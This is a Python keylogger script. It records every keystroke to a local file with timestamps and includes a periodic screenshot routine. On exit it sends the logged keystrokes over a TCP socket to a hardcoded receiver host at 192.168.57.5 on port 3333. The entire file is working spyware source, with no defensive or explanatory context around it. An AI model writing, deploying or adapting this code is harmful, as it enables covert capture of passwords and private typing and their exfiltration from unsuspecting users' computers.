from pynput.keyboard import Listener, Key
import datetime
import time
import pyautogui
import socket

# Define the callback function to handle key press events
def on_press_function(key):
    # Write the pressed key to the file without single quotes
    with open("keylog2.txt", "a") as f:
        # Check if a special key is pressed, such as Enter, space, backspace (for deletion), etc
        if key == Key.enter:
            # Write a newline character to separate phrases
            f.write(f" - {datetime.datetime.now()}\n")
            f.write("\n")
        elif key == Key.space:
            # Write a space character to separate words
            f.write(" ")
        elif key == Key.backspace:
            f.write("[BACKSPACE]")
        else:
            f.write(str(key).strip("'"))

def capture_screenshot():
    # Generate a unique filename using the current timestamp
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    filename = f"screenshot_{timestamp}.png"

    # Capture the screenshot and save it
    screenshot = pyautogui.screenshot()
    screenshot.save(filename)
    
def send_file():
    # Specify the IP address and port of the receiver machine
    receiver_ip = "192.168.57.5"
    receiver_port = 3333

    # Read the content of the file
    with open("keylog2.txt", "rb") as file:
        file_content = file.read()

    # Create a socket and establish a connection
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        try:
            sock.connect((receiver_ip, receiver_port))

            # Send the file content
            sock.sendall(file_content)

            print("File sent successfully.")
        except ConnectionRefusedError:
            print(f"Connection to {receiver_ip}:{receiver_port} refused. Make sure the server is running.")
        except Exception as e:
            print(f"Error occurred while sending the file: {e}")

# Create the listener object and attach the callback function
with Listener(on_press=on_press_function) as listener:
    try:
        # Start the listener to begin capturing keyboard events
        listener.join()
        while True:
            capture_screenshot()
            time.sleep(10)
    except KeyboardInterrupt:
        # Handle CTRL+C to terminate the program gracefully
        print("\nProgram terminated by user.")
        with open("keylog2.txt", "a") as f:
            f.write("\n")
        send_file()  # Call send_file() here so that the file is sent before exiting
